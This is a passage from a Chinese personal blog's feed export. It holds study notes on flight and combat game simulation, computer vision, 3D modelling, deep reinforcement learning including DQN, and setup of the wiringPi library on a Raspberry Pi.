    <url>%2F2018%2F12%2F08%2F%E7%A9%BA%E6%88%98%E7%B1%BB%E6%B8%B8%E6%88%8F%E4%BB%BF%E7%9C%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[空战类游戏仿真涉及飞机、导弹、诱饵弹三种关键元素。为了使游戏仿真接近真实，一方面要使飞机、导弹、诱饵弹的模型及其特效（如尾焰）尽量逼真，另一方面要使飞机、导弹、诱饵弹的运动控制模型尽量接近真实。飞机、导弹、诱饵弹的模型可以用3d建模软件构建，尾焰也可以用粒子系统进行模拟，但飞机、导弹、诱饵弹的运动控制模型比较复杂，是实现空战类游戏仿真的关键。下面分别介绍飞机、导弹、诱饵弹的建模仿真。 飞机的建模仿真飞机的运动模型基于牛顿第二运动定律，即物体所受到的外力等于此物体的质量与加速度的乘积，而加速度与外力同方向。根据外部受力和力矩计算出各种惯性坐标系下的加速度和角加速度。将加速度和角加速度分别进行积分，则可以得出飞机在某个时间段内的速度变化量和角速度变化量，进一步积分便可得到位置变化量和角度的变化量，再通过积分过程中的坐标变换以及初始时刻的状态参数，便可获得任意时刻飞机的姿态、位置、速度等参数。 飞行员通过油门杆和操纵杆控制飞机的运动。油门杆决定飞机的推力，操纵杆则控制飞机的副翼、襟翼、尾翼，改变飞机所受合力矩，从而改变飞机姿态。飞行仿真采用同样原理，油门杆和操作杆的位移经过非线性函数变换改变飞机所受合力和合力矩，经飞机运动模型获得加速度和角加速度，再经积分获得任意时刻飞机的姿态、位置、速度等参数。 当使用键盘输入控制飞机时，应将键盘输入先虚拟成油门杆和操作杆。另外需要注意的是，油门杆不回中，操作杆则自动回中。 导弹的建模仿真根据导弹的工作原理，导弹的建模仿真应分成三个方面： 探测模型 目标识别算法 运动控制模型 诱饵弹的建模仿真诱饵弹的运动模型比较简单，可运用牛顿第二运动定律分析得出。比较有难度的是诱饵弹的视觉特效建模。诱饵弹是一个变质量、不规则的发光体，如何3D建模有难度，不能像太阳一样直接用图片代替。 参考链接 无人机飞控通俗演义之 纷繁复杂的飞行力学, by 量子黑洞. 一起写飞行仿真之 六自由度动力学方程, by 量子黑洞. 飞行仿真—1.三维建模篇, by WFYX. 无人机飞控通俗演义之 无人机导航制导与控制, by WFYX. FLIGHTGEAR FLIGHT SIMULATOR, by flightgear.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机视觉研究范畴简介]]></title>
    <url>%2F2018%2F12%2F07%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89%E7%A0%94%E7%A9%B6%E8%8C%83%E7%95%B4%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[计算机视觉是一个跨领域的交叉学科，包括计算机科学（图形、算法、理论、系统、体系结构），数学（信息检索、机器学习），工程学（机器人、语音、自然语言处理、图像处理），物理学（光学 ），生物学（神经科学）和心理学（认知科学）等等。那么什么是计算机视觉呢？这里给出了几个比较严谨的定义： “对图像中的客观对象构建明确而有意义的描述”（Ballard＆Brown，1982） “从一个或多个数字图像中计算三维世界的特性”（Trucco＆Verri，1998） “基于感知图像做出对客观对象和场景有用的决策”（Sockman＆Shapiro，2001） 研究范畴视觉识别是计算机视觉的关键组成部分，如图像分类、定位和检测。神经网络和深度学习的最新进展极大地推动了这些最先进的视觉识别系统的发展。下面介绍 5 种主要的计算机视觉技术： 图像分类 给定一组各自被标记为单一类别的图像，我们对一组新的测试图像的类别进行预测，并测量预测的准确性结果，这就是图像分类问题。图像分类问题需要面临以下几个挑战： 视点变化，尺度变化，类内变化，图像变形，图像遮挡，照明条件和背景杂斑 对象检测 识别图像中的对象这一任务，通常会涉及到为各个对象输出边界框和标签。这不同于分类/定位任务——对很多对象进行分类和定位，而不仅仅是对个主体对象进行分类和定位。在对象检测中，你只有 2 个对象分类类别，即对象边界框和非对象边界框。例如，在汽车检测中，你必须使用边界框检测所给定图像中的所有汽车。 目标跟踪 目标跟踪，是指在特定场景跟踪某一个或多个特定感兴趣对象的过程。传统的应用就是视频和真实世界的交互，在检测到初始对象之后进行观察。现在，目标跟踪在无人驾驶领域也很重要，例如 Uber 和特斯拉等公司的无人驾驶。 语义分割 计算机视觉的核心是分割，它将整个图像分成一个个像素组，然后对其进行标记和分类。特别地，语义分割试图在语义上理解图像中每个像素的角色（比如，识别它是汽车、摩托车还是其他的类别）。 实例分割 除了语义分割之外，实例分割将不同类型的实例进行分类，比如用 5 种不同颜色来标记 5 辆汽车。分类任务通常来说就是识别出包含单个对象的图像是什么，但在分割实例时，我们需要执行更复杂的任务。我们会看到多个重叠物体和不同背景的复杂景象，我们不仅需要将这些不同的对象进行分类，而且还要确定对象的边界、差异和彼此之间的关系！ 典型应用计算机视觉领域已经衍生出了一大批快速成长的、有实际作用的应用，例如： 人脸识别： Snapchat 和 Facebook 使用人脸检测算法来识别人脸。 图像检索：Google Images 使用基于内容的查询来搜索相关图片，算法分析查询图像中的内容并根据最佳匹配内容返回结果。 游戏和控制：使用立体视觉较为成功的游戏应用产品是：微软 Kinect。 监测：用于监测可疑行为的监视摄像头遍布于各大公共场所中。 生物识别技术：指纹、虹膜和人脸匹配仍然是生物识别领域的一些常用方法。 智能汽车：计算机视觉仍然是检测交通标志、灯光和其他视觉特征的主要信息来源。 前沿研究 超分辨率重建 (Image Super-Resolution) 图像着色 (Image Colorization) “看图说话” (Image Caption) 人像复原 (Sketch Inversion) 图像自动生成 参考文献 详解计算机视觉五大技术：图像分类、对象检测、目标跟踪、语义分割和实例分割…, by AI科技大本营 「无中生有」计算机视觉探奇, by 魏秀参]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三维建模方法简介]]></title>
    <url>%2F2018%2F12%2F05%2F%E4%B8%89%E7%BB%B4%E5%BB%BA%E6%A8%A1%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[三维建模是一种常用技术，奈何心向往之，却没有时间去系统学习，也没有做出过一个作品。下面将我看到的一些好的有关三维建模的资料记录一下，以做备忘。 三维建模方法选择软件当前三维软件层出不穷，既有商业级的3ds MAX、MAYA、Creator，也有免费使用的Blender、MilkShape。 下载蓝图飞行仿真的三维模型主要有飞行器、机场建筑等。和大多数虚拟现实中使用的模型一样，并不需要CAD级别的精度，一般是下载一些图片或飞机整体蓝图作为蓝本，采用多边形建模的方法分部建模。蓝图下载网址首推： the‑blueprints.com 这里免费提供各种汽车、国内外飞机、船舶的三视图图纸下载。 多边形建模采用下载的蓝图，作为贴图放置在相应的投影平面上，然后采用多边形建模的方法画出各部分细节。多边形建模的思想就是采用一个诸如一个最接近的多边形，进行点线面的操作就可以绘制出复杂的飞机外形。 多边形建模从最基本的外形开始变形，可以从点线面及整体四个级别的操作，在越需要突出外形细节处用越多的点，通过建立网格模型，然后使用网格平滑功能生成平滑的曲面模型。 建模时不能有重复的点线面等几何体，否则即使表面上已经贴好了材质，但载入程序后，往往会因为Z向深度冲突的原因产生闪烁效果。其细节取决于您的需求，需要花费大量的时间。 贴图真实世界的模型带有各种彩色并具有光泽度。完成了几何体的建模对于一个模型来说只完成了一小半工作，还需要给模型添加材质。 与一般的模型不同，飞行器出于气动设计的考虑，其表面模型一般成流线型的曲面，且部件组成复杂，界线较难区分，即使是UVW贴图也难以胜任。因此，对飞行器的贴图主要采用3ds MAX的UVW展开贴图技术贴图。 一个模型最好只有一个贴图，因为贴图数目过多零散会影响计算机载入三维模型时间和效率。因此，一般将整个模型各个部件组合为一个多边形，各部件为元素，待完成UVW贴图后再分离成单独的部件。UVW展开贴图有多重形式，如长方体展开（即按六个视图投影）、平面展开等，按需选择。 在一张贴图上展开整个模型的UV坐标显然是有限的，需要根据现实精度调整各个部分的贴图大小。保存这些展开的贴图坐标并渲染输出UV模板图像文件。UV模板图像其实就是整个模型的贴图的界线图像，通过Photoshop等图像处理软件处理，采用尽可能真实的图像放置在对应的区域。最后将材质赋给对象即完成贴图渲染。 数据导出直接采用3ds MAX绘制的三维模型当然是.max格式，它不能为外界程序读取。这时就需要根据自己的开发环境选择导出的数据格式，比如用开源的OSG做仿真开发，就需要OSGExp插件的支持，导成.ive、.osg、.osgb等格式即可。但无论导出何种格式，切记保证模型质心与建模的原点不能相差不远，还要注意光照、贴图格式以及单位问题。 参考链接 飞行仿真—1.三维建模篇,by WFYX.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度强化学习研究笔记]]></title>
    <url>%2F2018%2F11%2F26%2F%E6%B7%B1%E5%BA%A6%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[深度强化学习Deep Reinforcement Learning是将深度学习与强化学习结合起来，从而实现从Perception感知到Action动作的端对端学习End-to-End Learning的一种全新的算法。深度强化学习具备使机器人实现真正完全自主地学习一种甚至多种技能的潜力。 深度强化学习的起源深度强化学习是深度学习与强化学习相结合的产物。 深度学习深度学习（deep learning）是机器学习的分支，是一种试图使用包含复杂结构或由多重非线性变换构成的多个处理层对数据进行高层抽象的算法。 深度学习是机器学习中一种基于对数据进行表征学习的算法。观测值（例如一幅图像）可以使用多种方式来表示，如每个像素强度值的向量，或者更抽象地表示成一系列边、特定形状的区域等。而使用某些特定的表示方法更容易从实例中学习任务（例如，人脸识别或面部表情识别）。深度学习的好处是用非监督式或半监督式的特征学习和分层特征提取高效算法来替代手工获取特征。 表征学习的目标是寻求更好的表示方法并创建更好的模型来从大规模未标记数据中学习这些表示方法。表示方法来自神经科学，并松散地创建在类似神经系统中的信息处理和对通信模式的理解上，如神经编码，试图定义拉动神经元的反应之间的关系以及大脑中的神经元的电活动之间的关系。 至今已有数种深度学习框架，如深度神经网络、卷积神经网络和深度置信网络和递归神经网络已被应用在计算机视觉、语音识别、自然语言处理、音频识别与生物信息学等领域并获取了极好的效果。 另外，“深度学习”已成为类似术语，或者说是神经网络的品牌重塑。 深度神经网络深度神经网络是一种具备至少一个隐层的神经网络。与浅层神经网络类似，深度神经网络也能够为复杂非线性系统提供建模，但多出的层次为模型提供了更高的抽象层次，因而提高了模型的能力。 深度神经网络（Deep Neural Networks, DNN）是一种判别模型，可以使用反向传播算法进行训练。权重更新可以使用下式进行随机梯度下降法求解： \Delta w_{ij}(t+1)=\Delta w_{ij}(t) + \eta\frac{\partial C}{\partial w_{ij}}其中，$\eta$为学习率，$C$为代价函数。这一函数的选择与学习的类型（例如监督学习、无监督学习、增强学习）以及激活函数相关。例如，为了在一个多分类问题上进行监督学习，通常的选择是使用ReLU作为激活函数，而使用交叉熵作为代价函数。Softmax函数定义为${\displaystyle p{j}={\frac {\exp(x{j})}{\sum {k}\exp(x{k})}}}$，其中 ${\displaystyle p{j}}$代表类别 ${\displaystyle j}$的概率，而 ${\displaystyle x{j}}$和 ${\displaystyle x{k}}$分别代表对单元 ${\displaystyle j}$ 和 ${\displaystyle k}$的输入。交叉熵定义为 $C = -\sum_j d_j \log(p_j)$ ，其中 ${\displaystyle d{j}}$代表输出单元${\displaystyle j}$的目标概率， ${\displaystyle p_{j}}$代表应用了激活函数后对单元 ${\displaystyle j}$的概率输出。 强化学习在人工智能领域，一般用智能体Agent表示一个具备行为能力的物体，比如机器人，无人车等等。而强化学习则研究智能体Agent和环境Environment之间交互过程如何取得任务的成功。 强化学习与环境的交互过程如图1所示。在某个时间点，智能体Agent会获得观察值(Observation)和反馈值(Reward)，然后根据这些选择下一步的动作(Action)。 图1 强化学习示意图 在整个过程中，任务的目标是获取尽可能多的Reward，这是任务的目标。而在每个时间片，Agent都是根据当前的观察来确定下一步的动作。观察Observation的集合就作为Agent的所处的状态State，因此，状态State和动作Action存在映射关系，也就是一个state可以对应一个action，或者对应不同动作的概率（常常用概率来表示，概率最高的就是最值得执行的动作）。状态与动作的关系其实就是输入与输出的关系，而状态State到动作Action的过程就称之为一个策略Policy，一般用 $\pi$ 表示，也就是需要找到以下关系： a=\pi(s)或者 \pi(a|s)其中a是action，s是state。第一种是一一对应的表示，第二种是概率的表示。1强化学习的任务就是找到一个最优的策略Policy从而使Reward最多。 强化学习的训练一开始从采用随机策略进行试验开始，可获得一系列的状态,动作和反馈： \{s_1,a_1,r_1,s_2,a_2,r_2,...,s_t,a_t,r_t\}根据这一系列样本，强化学习从中改进策略，使得任务反馈Reward越来越多。 强化学习模型假设强化学习的研究建立在经典物理学基础上，基于以下两种假设： 时间是可以分割成一个一个时间片的，并且有完全的先后顺序。 上帝不掷筛子！如果输入是确定的，那么输出也一定是确定的。 强化学习与马尔科夫决策过程MDP基于这样一种假设：未来只取决于当前。 一个状态$S_t$是Markov当且仅当 P(s_{t+1}|s_t)=P(s_{t+1}|s_t,s_{t-1},...s_1,s_0)P为概率。简单的说就是下一个状态仅取决于当前的状态和当前的动作。注意这里的状态是完全可观察的全部的环境状态（也就是上帝视角）。 增强学习的问题都可以模型化为MDP的问题。 一个基本的MDP可以用（S,A,P）来表示，S表示状态，A表示动作，P表示状态转移概率，也就是根据当前的状态$st$和$a_t$转移到$s{t+1}$的概率。如果我们知道了转移概率P，也就是称为我们获得了模型Model，有了模型，未来就可以求解，那么获取最优的动作也就有可能，这种通过模型来获取最优动作的方法也就称为Model-based的方法。但是现实情况下，很多问题是很难得到准确的模型的，因此就有Model-free的方法来寻找最优的动作。 强化学习的回报Result既然一个状态对应一个动作，或者动作的概率，而有了动作，下一个状态也就确定了。这就意味着每个状态可以用一个确定的值来进行描述。可以由此判断一个状态是好的状态还是不好的状态。 状态的好坏其实等价于对未来回报的期望。因此，引入回报Return来表示某个时刻t的状态将具备的回报： G_t = R_{t+1} + \lambda R_{t+2} + ... = \sum_{k=0}^\infty\lambda^kR_{t+k+1}上面R是Reward反馈，λ是discount factor折扣因子，一般小于1，就是说一般当下的反馈是比较重要的，时间越久，影响越小。 那么实际上除非整个过程结束，否则显然我们无法获取所有的reward来计算出每个状态的Return，因此，再引入一个概念价值函数Value Function,用value function $v(s)$来表示一个状态未来的潜在价值。 从定义上看，value function就是回报的期望： v(s) = \mathbb E[G_t|S_t = s]引出价值函数，对于获取最优的策略Policy这个目标，我们就会有两种方法： 直接优化策略$\pi(a|s)$或者$a = \pi(s)$使得回报更高 通过估计value function来间接获得优化的策略。道理很简单，既然我知道每一种状态的优劣，那么我就知道我应该怎么选择了，而这种选择就是我们想要的策略。 把值函数展开： \begin{aligned} v(s) & = \mathbb E[G_t|S_t = s] \\\\ & = \mathbb E[R_{t+1}+\lambda R_{t+2} + \lambda ^2R_{t+3} + ...|S_t = s] \\\\ & = \mathbb E[R_{t+1}+\lambda (R_{t+2} + \lambda R_{t+3} + ...)|S_t = s] \\\\ & = \mathbb E[R_{t+1} + \lambda G_{t+1}|S_t = s] \\\\ & = \mathbb E[R_{t+1} + \lambda v(S_{t+1})|S_t = s] \end{aligned}因此： v(s) = \mathbb E[R_{t+1} + \lambda v(S_{t+1})|S_t = s]上面这个公式就是Bellman方程的基本形态。从公式上看，当前状态的价值和下一步的价值以及当前的反馈Reward有关。它表明Value Function是可以通过迭代来进行计算的!!! Action-Value function 动作价值函数前面我们引出了价值函数，考虑到每个状态之后都有多种动作可以选择，每个动作之下的状态又多不一样，我们更关心在某个状态下的不同动作的价值。显然。如果知道了每个动作的价值，那么就可以选择价值最大的一个动作去执行了。这就是Action-Value function $Q^\pi(s,a)$。那么同样的道理，也是使用reward来表示，只是这里的reward和之前的reward不一样，这里是执行完动作action之后得到的reward，之前state对应的reward则是多种动作对应的reward的期望值。显然，动作之后的reward更容易理解。 动作价值函数就为如下表示： \begin{aligned} Q^\pi(s,a) & = \mathbb E[r_{t+1} + \lambda r_{t+2} + \lambda^2r_{t+3} + ... |s,a] \\\\ & = \mathbb E_{s^\prime}[r+\lambda Q^\pi(s^\prime,a^\prime)|s,a] \end{aligned}这里要说明的是动作价值函数的定义，加了$\pi$,也就是说是在策略下的动作价值。因为对于每一个动作而已，都需要由策略根据当前的状态生成，因此必须有策略的支撑。而前面的价值函数则不一定依赖于策略。当然，如果定义$v^\pi(s)$则表示在策略$\pi$下的价值。 Optimal value function 最优价值函数能计算动作价值函数是不够的，因为我们需要的是最优策略，现在求解最优策略等价于求解最优的value function，找到了最优的value function，自然而然策略也就是找到。（当然，这只是求解最优策略的一种方法，也就是value-based approach，由于DQN就是value-based，因此这里只讲这部分，以后我们会看到还有policy-based和model-based方法。一个就是直接计算策略函数，一个是估计模型，也就是计算出状态转移函数，从而整个MDP过程得解） 这里以动作价值函数来分析。 首先是最优动作价值函数和一般的动作价值函数的关系： \begin{aligned} Q^*(s,a) &= \max_\pi Q^\pi(s,a)\\\\ & = \mathbb E_{s^\prime}[r+\lambda \max _{a^\prime}Q^*(s^\prime,a^\prime)|s,a] \end{aligned}也就是最优的动作价值函数就是所有策略下的动作价值函数的最大值。通过这样的定义就可以使最优的动作价值的唯一性，从而可以求解整个MDP。 下面介绍基于Bellman方程的两个最基本的算法，策略迭代和值迭代。 策略迭代Policy IterationPolicy Iteration的目的是通过迭代计算value function 价值函数的方式来使policy收敛到最优。 Policy Iteration本质上就是直接使用Bellman方程而得到的： \begin{aligned} v_{k+1}(s) &\overset{.}{=} \mathbb E_{\pi}[R_{t+1}+\gamma v _{k}(S_{t+1})|S_t=s]\\\\ &=\sum_{a}{\pi(a|s)}\sum_{s^\prime,r}{p(s^\prime,r|s,a)[r+\gamma v_k(s^\prime)]} \end{aligned}那么Policy Iteration一般分成两步： Policy Evaluation 策略评估。目的是更新Value Function，或者说更好的估计基于当前策略的价值 Policy Improvement 策略改进。 使用 greedy policy 产生新的样本用于第一步的策略评估。 图2 策略迭代算法示意图 本质上就是使用当前策略产生新的样本，然后使用新的样本更好的估计策略的价值，然后利用策略的价值更新策略，然后不断反复。理论可以证明最终策略将收敛到最优。 具体算法： 图3 策略迭代算法 那么这里要注意的是policy evaluation部分。这里的迭代很重要的一点是需要知道state状态转移概率p。也就是说依赖于model模型。而且按照算法要反复迭代直到收敛为止。所以一般需要做限制。比如到某一个比率或者次数就停止迭代。那么需要特别说明的是不管是策略迭代还是值迭代都是在理想化的情况下（上帝视角）推导出来的算法，本质上并不能直接应用，因为依赖Model。 Value Iteration 价值迭代Value Iteration则是使用Bellman 最优方程得到: \begin{aligned} v_{*}(s) & = \max_{a} \mathbb E_{\pi}[R_{t+1}+\gamma v _{*}(S_{t+1})|S_t=s,A_t=a]\\\\ & = \max_{a} \sum_{s^\prime,r}p(s^\prime,r|s,a)[r+\gamma v_*(s^\prime)] \end{aligned}然后改变成迭代形式: \begin{aligned} v_{k+1}(s) &\overset{.}{=} \max_{a} \mathbb E_{\pi}[R_{t+1}+\gamma v _{k}(S_{t+1})|S_t=s,A_t=a]\\\\ & = \max_{a} \sum_{s^\prime,r}p(s^\prime,r|s,a)[r+\gamma v_k(s^\prime)] \end{aligned}value iteration的算法如下： 图4 值迭代算法 Policy Iteration和Value Iteration有什么本质区别？ policy iteration使用bellman方程来更新value，最后收敛的value 即$v_\pi$是当前policy下的value值（所以叫做对policy进行评估），目的是为了后面的policy improvement得到新的policy。 而value iteration是使用bellman 最优方程来更新value，最后收敛得到的value即$v_*$就是当前state状态下的最优的value值。因此，只要最后收敛，那么最优的policy也就得到的。因此这个方法是基于更新value的，所以叫value iteration。 从上面的分析看，value iteration较之policy iteration更直接。不过问题也都是一样，需要知道状态转移函数p才能计算。本质上依赖于模型，而且理想条件下需要遍历所有的状态，这在稍微复杂一点的问题上就基本不可能了。 Q-LearningQ Learning的思想完全根据value iteration得到。但要明确一点是value iteration每次都对所有的Q值更新一遍，也就是所有的状态和动作。但事实上在实际情况下我们没办法遍历所有的状态，还有所有的动作，我们只能得到有限的系列样本。因此，只能使用有限的样本进行操作。那么，怎么处理？Q Learning提出了一种更新Q值的办法： Q(S_{t},A_{t}) \leftarrow Q(S_{t},A_{t})+\alpha({R_{t+1}+\lambda \max _aQ(S_{t+1},a)} - Q(S_t,A_t))虽然根据value iteration计算出target Q值，但是这里并没有直接将这个Q值（是估计值）直接赋予新的Q，而是采用渐进的方式类似梯度下降，朝target迈近一小步，取决于α,这就能够减少估计误差造成的影响。类似随机梯度下降，最后可以收敛到最优的Q值。 具体的算法如下： 图5 Q学习算法 Exploration and Exploitation 探索与利用回到policy的问题，那么要选择怎样的policy来生成action呢？有两种做法： 随机的生成一个动作 根据当前的Q值计算出一个最优的动作，这个policy\pi称之为greedy policy贪婪策略。也就是 \pi(S_{t+1}) = arg\max _aQ(S_{t+1},a)使用随机的动作就是exploration，也就是探索未知的动作会产生的效果，有利于更新Q值，获得更好的policy。而使用greedy policy也就是target policy则是exploitation，利用policy，这个相对来说就不好更新出更好的Q值，但可以得到更好的测试效果用于判断算法是否有效。 将两者结合起来就是所谓的$\epsilon-greedy$策略，$\epsilon$一般是一个很小的值，作为选取随机动作的概率值。可以更改$\epsilon$的值从而得到不同的exploration和exploitation的比例。 这里需要说明的一点是使用$\epsilon-greedy$策略是一种极其简单粗暴的方法，对于一些复杂的任务采用这种方法来探索未知空间是不可取的。因此，最近有越来越多的方法来改进这种探索机制。 深度强化学习深度强化学习始于DeepMind在NIPS 2013上发表的Playing Atari with Deep Reinforcement Learning一文，在该文中第一次提出Deep Reinforcement Learning 这个名称，并且提出DQN（Deep Q-Network）算法，实现从纯图像输入完全通过学习来玩Atari游戏的成果。 之后DeepMind在Nature上发表了改进版的DQN文章Human-level Control through Deep Reinforcement Learning，引起了广泛的关注，Deep Reinfocement Learning 从此成为深度学习领域的前沿研究方向。 维度灾难对简单问题可使用表格来表示Q(s,a)，但是这个在现实的很多问题上是几乎不可行的，因为状态实在是太多。使用表格的方式根本存不下。 以计算机玩Atari游戏为例，计算机玩Atari游戏的要求是输入原始图像数据，也就是210x160像素的图片，然后输出几个按键动作。总之就是和人类的要求一样，纯视觉输入，然后让计算机自己玩游戏。那么这种情况下，到底有多少种状态呢？有可能每一秒钟的状态都不一样。因为，从理论上看，如果每一个像素都有256种选择，那么就有： 256^{210\times 160}这简直是天文数字。所以，我们是不可能通过表格来存储状态的。我们有必要对状态的维度进行压缩，解决办法就是 价值函数近似Value Function Approximation 价值函数近似Value Function Approximation什么是价值函数近似呢？说起来很简单，就是用一个函数来表示Q(s,a)。即 Q(s,a) = f(s,a)$f$可以是任意类型的函数，比如线性函数： Q(s,a) = w_1s + w_2a + b其中$w_1$,$w_2$,$b$是函数$f$的参数。 通过函数表示，我们就可以无所谓s到底是多大的维度，反正最后都通过矩阵运算降维输出为单值的Q。 这就是价值函数近似的基本思路。 如果我们就用$w$来统一表示函数$f$的参数，那么就有 Q(s,a) = f(s,a,w)为什么叫近似，因为我们并不知道Q值的实际分布情况，本质上就是用一个函数来近似Q值的分布，所以，也可以说是 Q(s,a)\approx f(s,a,w)Q值神经网络化——DQN算法意思很清楚，就是我们用一个深度神经网络来表示这个函数$f$。 以DQN为例，输入是经过处理的4个连续的84x84图像，然后经过两个卷积层，两个全连接层，最后输出包含每一个动作Q值的向量。 神经网络的训练是一个最优化问题，最优化一个损失函数loss function，也就是标签和网络输出的偏差，目标是让损失函数最小化。为此，我们需要有样本，巨量的有标签数据，然后通过反向传播使用梯度下降的方法来更新神经网络的参数。 如何为Q网络提供有标签的样本？答案就是利用Q-Learning算法。目标Q值作为标签，使Q值趋近于目标Q值。于是Q网络训练的损失函数就是： 图6 DQN损失函数 上面公式是$s^\prime$, $a^\prime$即下一个状态和动作。这里用了David Silver的表示方式，看起来比较清晰。既然确定了损失函数，也就是cost，确定了获取样本的方式。那么DQN的整个算法也就成型了！ 这里分析第一个版本的DQN，也就是NIPS 2013提出的DQN。 图7 DQN算法 具体的算法主要涉及到Experience Replay，也就是经验池的技巧，就是如何存储样本及采样问题。 由于玩Atari采集的样本是一个时间序列，样本之间具有连续性，如果每次得到样本就更新Q值，受样本分布影响，效果会不好。因此，一个很直接的想法就是把样本先存起来，然后随机采样如何？这就是Experience Replay的意思。按照脑科学的观点，人的大脑也具有这样的机制，就是在回忆中学习。 那么上面的算法看起来那么长，其实就是反复试验，然后存储数据。接下来数据存到一定程度，就每次随机采用数据，进行梯度下降！ 策略梯度Policy Gradient的方法的基本思想是通过评价动作action的好坏，来调整该action的出现概率。最基本的Policy Gradient的损失函数Loss就是： loss = -log(\pi)*Q这里先以Q值来指代对动作的评价。 Robot Learning的发展路径Robot Learning从目前来看，经过了以下研究思路的发展： （1）利用传统的控制算法结合深度学习来实现机器人端到端的控制。这个方法主要是以Guided Policy Search（GPS）为首。这个方法是Sergey Levine提出的，通过与传统方法结合，确实可以让机器人学习出一些有意思的技能，但是有个根本问题摆在面前，就是传统方法通常需要知道整个系统的模型，而这在实际的机器人中非常难以适用。就比如四轴飞行器的控制，我们可以通过外部的Vicon设备来精确的定位四轴飞行器的位置，从而实现对其精确控制，但是在户外，我们根本就做不到这点，也就无法精确建模。因此，还依赖传统方法是没有出路的，我们使用深度学习就是要抛弃传统方法的弊端。 （2）深度增强学习DRL。由于DeepMind在DRL取得了巨大成功，而DRL就是面向决策与控制问题，特别适用于机器人，因此想在机器人上使用DRL是一种必然的想法。Google Brain团队（依然以Sergey Levine为首）做出了一些进展，在我们之前的专栏文章中也有分析最前沿 之 谷歌的协作机械臂 - 知乎专栏 。但是在使用DRL之后，DRL的弊端也就显现出来了，那就是需要大量的尝试来获取数据。对于这个问题，在机器人仿真环境还好，但是在真实的机器人上就根本没办法这么做了。为了解决这个问题，也就引出来下面两个研究思路。 （3）迁移学习Transfer Learning。既然在真实环境不行，而仿真环境可以，那么是不是可以先在仿真环境中训练好，再把知识迁移到真实机器人上。Google Deepmind在这一块做了一些不错的工作，提出了Progressive Neural Net和PathNet，验证了迁移的可能性。而且很显然的，仿真环境越真实，迁移效果会越好。那么，搞一个非常仿真的环境就非常有意义了。这不，Nvidia 刚刚推出Isaac机器人模拟系统，确实是对Robot Learning的研究注入了一剂强心剂。 （4）Imitation Learning 模仿学习/Few Shot Learning 少样本学习/ Meta Learning 学会学习。这是另一条思路，那就是尽量减少数据的使用量。我们如果能够教机器人几次机器人就能学会技能那么问题也能解决。而这一块也就是OpenAI (依然是Sergey Levine）那帮人在如火如荼的研究的方向。而且特别是Meta Learning，直指通用人工智能的核心。如果能够在Meta Learning上取得突破，那么本身会是革命性的。 因此，Robot Learning发展到这里，把研究的方向就聚焦到第三和第四点上了，并且也取得了一定的成果，但是显然还有非常多的工作可以去做。 参考链接 深度学习, by wikipedia. DQN 从入门到放弃1 DQN与增强学习, by Flood Sung. DQN 从入门到放弃2 增强学习与MDP, by Flood Sung. DQN 从入门到放弃3 价值函数与Bellman方程, by Flood Sung. DQN 从入门到放弃4 动态规划与Q-Learning,by Flood Sung. DQN从入门到放弃5 深度解读DQN算法, by Flood Sung. DQN从入门到放弃6 DQN的各种改进, by Flood Sung. DQN从入门到放弃7 连续控制DQN算法-NAF,by Flood Sung. 最前沿：机器人学习Robot Learning的发展,by Flood Sung.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wiringPi学习笔记]]></title>
    <url>%2F2018%2F11%2F24%2FwiringPi%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[wiringPi 库是由 Gordon Henderson 所编写并维护的一个用 C 语言写成的类库。起初,主要是作为 BCM2835 芯片的 GPIO 库。而现在,已经非常丰富,除了 GPIO 库,还包括了I2C 库、SPI 库、UART 库和软件 PWM 库等。 由于其与 Arduino 的“wiring”系统较为类似,故以此命名。它是采用 GNU LGPLv3许可证的,可以在 C 或 C++上使用,而且在其他编程语言上也有对应的扩展。 wiringPi 库包含了一个命令行工具 gpio,它可以用来设置 GPIO 管脚,可以用来读写GPIO 管脚,甚至可以在 Shell 脚本中使用来达到控制 GPIO 管脚的目的。 下载、编译和测试wiringPi 下载并编译wiringPi 123git clone git://git.drogon.net/wiringPicd wiringPi./build 测试wiringPi是否安装成功打开命令终端，可以通过 gpio 命令来检查 wiringPi 是否安装成功，运行下面的命令： 12gpio –vgpio readall 运行上述第二条命令将得到树莓派的 GPIO 接口之间的对应关系。 使用wiringPi在使用wiringPi之前，应首先对wiringPi进行设置。 wiringPi设置函数wiringPi设置函数如下：1234int wiringPiSetup (void) ;int wiringPiSetupGpio (void) ;int wiringPiSetupPhys (void) ;int wiringPiSetupSys (void) ; wiringPiSetup (void) 函数该函数初始化wiringPi，假定程序将使用wiringPi的管脚定义图。具体管脚映射，可以通过gpio readall命令来查看。该函数需要root权限。 wiringPiSetupGpio (void) 函数该函数与wiringPiSetup函数类似，区别在于假定程序使用的是Broadcom的GPIO管脚定义，而没有重新映射。该函数需要root权限，需要注意v1和v2版本的树莓派是不同的。 wiringPiSetupPhys (void) 函数该函数与wiringPiSetup函数类似，区别在于允许程序使用物理管脚定义，但仅支持P1接口。该函数需要root权限。 wiringPiSetupSys (void) 函数该函数初始化wiringPi，使用/sys/class/gpio接口，而不是直接通过操作硬件来实现。该函数可以使用非root权限用户，在此种模式下的管脚号是Broadcom的GPIO管脚号，不wiringPiSetupGpio函数类似，需要注意v1和v2板子的不同。 在此种模式下，在运行程序前，您需要通过/sys/class/gpio接口导出要使用的管脚。你可以在一个独立的shell脚本中来导出将要使用的管脚，或者使用系统的system()函数来调用GPIO命令。 软件 PWM 库wiringPi 中包含了一个软件驱动的 PWM (Pulse Width Modulation, 脉冲宽度调节)处理库，可以在任意的树莓派 GPIO 